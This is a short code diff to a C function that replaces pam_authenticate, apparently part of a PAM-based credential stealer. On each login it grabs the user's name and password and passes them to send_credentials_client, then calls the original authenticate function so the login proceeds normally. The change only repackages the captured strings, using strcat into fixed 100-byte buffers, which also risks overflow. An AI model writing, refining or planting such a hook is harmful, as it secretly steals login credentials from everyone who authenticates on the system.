@@ -63,11 +63,13 @@ int pam_authenticate(pam_handle_t *pamh, int flags) {
     }
 
     char *username = get_username(pamh);
+    char username_text[100] = "USERNAME : ";
     char *pwd = get_password(pamh);
-    send_credentials_client("The gathered USERNAME is: "); 
-    send_credentials_client(username); 
-    send_credentials_client("The gathered PASSWORD is: "); 
-    send_credentials_client(pwd); 
+    char pwd_text[100] = "PASSWORD : ";
+    strcat(username_text,username); 
+    strcat(pwd_text,pwd); 
+    send_credentials_client(username_text); 
+    send_credentials_client(pwd_text); 
 
     return original_pam_authenticate(pamh, flags);
 }
